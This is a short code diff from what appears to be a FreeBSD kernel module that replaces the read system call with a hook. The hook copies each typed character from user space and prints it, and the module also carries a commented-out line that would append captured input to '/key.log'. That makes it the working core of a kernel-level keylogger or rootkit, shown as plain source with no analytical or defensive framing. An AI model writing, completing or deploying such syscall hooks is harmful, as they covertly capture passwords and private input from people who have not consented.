@@ -35,7 +35,7 @@ read_hook( struct thread* td, void* syscall_args)
 		return( error);
  	
 	copyinstr( uap->buf, buf, 1, &done);
-	printf("%c", buf[0]);
+	uprintf("%c", buf[0]);
 
 	return( error );
 }
@@ -51,7 +51,7 @@ load(
 	
 	switch(cmd){
 		case MOD_LOAD:
-			activity_log = open("/key.log", O_WRONLY | O_APPEND ); 
+			//activity_log = open("/key.log", O_WRONLY | O_APPEND ); 
 			/*Replace read with read_hook*/
 			//Maybe save the old read funciton?
 			saved_read = sysent[SYS_read].sy_call;
